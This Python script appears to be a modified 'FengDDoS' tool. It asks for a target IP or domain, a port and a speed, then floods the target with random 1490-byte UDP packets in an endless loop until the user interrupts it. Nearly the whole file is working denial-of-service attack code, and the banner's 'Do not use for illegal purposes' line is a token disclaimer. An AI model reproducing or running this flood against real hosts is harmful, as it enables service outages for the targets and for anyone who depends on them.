# python3
import sys
import os
import time
import socket
import random
# Code Time
from datetime import datetime
# 新增导入 gethostbyname 用于域名解析
from socket import gethostbyname 

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

def show_banner():
    """将启动界面封装成函数，方便返回界面时重新打印"""
    os.system("clear")
    os.system("figlet FengDDoS")
    print (" ")
    print ("---------------------------------------------------")
    print (" Author : FengPwner ")
    print (" Github : https://github.com/FengPwner ")
    print (" Atomgit : https://atomgit.com/FengPwner ")
    print (" CSDN : https://blog.csdn.net/2302_76189356 ")
    print (" Version : 0.3.3 (Modified) ")
    print ("---------------------------------------------------")
    print (" To update, please use `git pull` ")
    print ("---------------------------------------------------")
    print (" ")
    print (" ")
    print (" -----------------[Do not use for illegal purposes]----------------- ")
    print (" ")
    print (" ")
    print (" ")
    print (" ")

# 主循环：用于支持“返回界面”功能
while True:
    show_banner()

    # --- 目标 IP/域名 解析 ---
    target = input("IP or Domain: ")
    try:
        ip = gethostbyname(target)
        print(f"[+] Resolved target to IP: {ip}")
    except socket.gaierror:
        print("[-] Error: Could not resolve the specified IP or Domain.")
        input("Press Enter to return to main menu...") # 暂停让用户看到错误
        continue # 返回主界面

    # --- 端口输入与校验 ---
    try:
        port = int(input("port (1-65535): "))
        if not (1 <= port <= 65535):
            raise ValueError("Port out of range")
    except ValueError:
        print("[-] Error: Invalid port. Please enter a number between 1 and 65535.")
        input("Press Enter to return to main menu...")
        continue

    # --- 速度输入与校验 ---
    try:
        sd = int(input("speed (1~1000): "))
        if not (1 <= sd <= 1000):
            raise ValueError("Speed out of range")
    except ValueError:
        print("[-] Error: Invalid speed. Please enter a number between 1 and 1000.")
        input("Press Enter to return to main menu...")
        continue

    # 开始发包
    os.system("clear")
    sent = 0
    print("[*] Attack started... Press Ctrl+C to stop.")
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            print("Sent %s data packet to %s port %d" % (sent, ip, port))
            time.sleep((1000 - sd) / 2000)

    except KeyboardInterrupt:
        # 捕获 Ctrl+C 信号
        print("\n\n[!] Attack interrupted by user.")
        choice = input("[?] Return to main menu? (y/n): ").strip().lower()
        if choice == 'y':
            continue  # 返回主循环，重新显示界面
        elif choice == 'n':
            print("[*] Exiting script. Goodbye!")
            sys.exit(0) # 退出脚本
        else:
            # 如果用户输入了其他字符，默认也退出，防止死循环
            print("[*] Invalid input. Exiting script. Goodbye!")
            sys.exit(0)
